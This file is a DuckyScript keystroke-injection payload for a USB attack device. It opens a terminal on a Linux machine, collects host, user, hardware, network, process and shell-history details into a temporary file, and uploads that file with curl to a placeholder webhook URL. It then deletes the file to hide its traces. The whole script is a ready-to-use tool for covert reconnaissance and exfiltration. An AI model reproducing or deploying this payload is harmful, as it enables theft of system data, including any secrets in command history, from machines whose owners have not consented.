REM Author: edgecase963
REM Quickly gathers information on Linux-based systems and sends it to a webhook
REM Replace "WEBHOOK_URL" with your webhook URL
REM This script requires that curl is installed on the system


CTRL-ALT t
DELAY 1000

STRING echo "Hostname: " > /tmp/Linux_Recon.txt
ENTER
STRING uname -n >> /tmp/Linux_Recon.txt
ENTER
STRING echo " " >> /tmp/Linux_Recon.txt
ENTER
STRING echo "User: " >> /tmp/Linux_Recon.txt
ENTER
STRING whoami >> /tmp/Linux_Recon.txt
ENTER

STRING uname -a >> /tmp/Linux_Recon.txt
ENTER
DELAY 100

STRING echo " " >> /tmp/Linux_Recon.txt
ENTER
STRING echo "CPU INFORMATION" >> /tmp/Linux_Recon.txt
ENTER
STRING echo "---------------------" >> /tmp/Linux_Recon.txt
ENTER

STRING lscpu >> /tmp/Linux_Recon.txt
ENTER
DELAY 100

STRING echo " " >> /tmp/Linux_Recon.txt
ENTER
STRING echo "BLOCK INFORMATION" >> /tmp/Linux_Recon.txt
ENTER
STRING echo "---------------------" >> /tmp/Linux_Recon.txt
ENTER

STRING lsblk >> /tmp/Linux_Recon.txt
ENTER
DELAY 100

STRING echo " " >> /tmp/Linux_Recon.txt
ENTER
STRING echo "USB INFORMATION" >> /tmp/Linux_Recon.txt
ENTER
STRING echo "---------------------" >> /tmp/Linux_Recon.txt
ENTER

STRING lsusb >> /tmp/Linux_Recon.txt
ENTER
DELAY 100

STRING echo " " >> /tmp/Linux_Recon.txt
ENTER
STRING echo "NETWORK INFORMATION" >> /tmp/Linux_Recon.txt
ENTER
STRING echo "---------------------" >> /tmp/Linux_Recon.txt
ENTER

STRING ifconfig >> /tmp/Linux_Recon.txt
ENTER
DELAY 100

STRING echo " " >> /tmp/Linux_Recon.txt
ENTER
STRING echo "ROUTE INFORMATION" >> /tmp/Linux_Recon.txt
ENTER
STRING echo "---------------------" >> /tmp/Linux_Recon.txt
ENTER

STRING route -n >> /tmp/Linux_Recon.txt
ENTER
DELAY 100

STRING echo " " >> /tmp/Linux_Recon.txt
ENTER
STRING echo "MEMORY INFORMATION" >> /tmp/Linux_Recon.txt
ENTER
STRING echo "---------------------" >> /tmp/Linux_Recon.txt
ENTER

STRING free -h >> /tmp/Linux_Recon.txt
ENTER
DELAY 100

STRING echo " " >> /tmp/Linux_Recon.txt
ENTER
STRING echo "FILESYSTEM INFORMATION" >> /tmp/Linux_Recon.txt
ENTER
STRING echo "---------------------" >> /tmp/Linux_Recon.txt
ENTER

STRING df -h >> /tmp/Linux_Recon.txt
ENTER
DELAY 100

STRING echo " " >> /tmp/Linux_Recon.txt
ENTER
STRING echo "PROCESS INFORMATION" >> /tmp/Linux_Recon.txt
ENTER
STRING echo "---------------------" >> /tmp/Linux_Recon.txt
ENTER

STRING ps -aux >> /tmp/Linux_Recon.txt
ENTER
DELAY 100

STRING echo " " >> /tmp/Linux_Recon.txt
ENTER
STRING echo "HISTORY INFORMATION" >> /tmp/Linux_Recon.txt
ENTER
STRING echo "---------------------" >> /tmp/Linux_Recon.txt
ENTER

STRING history >> /tmp/Linux_Recon.txt
ENTER
DELAY 100

STRING echo " " >> /tmp/Linux_Recon.txt
ENTER
STRING echo "HARDWARE INFORMATION" >> /tmp/Linux_Recon.txt
ENTER
STRING echo "---------------------" >> /tmp/Linux_Recon.txt
ENTER

STRING lshw -short >> /tmp/Linux_Recon.txt
ENTER
DELAY 200

STRING curl -F "file=@/tmp/Linux_Recon.txt" 'WEBHOOK_URL'
ENTER
DELAY 200

STRING rm /tmp/Linux_Recon.txt
ENTER

STRING exit
ENTER
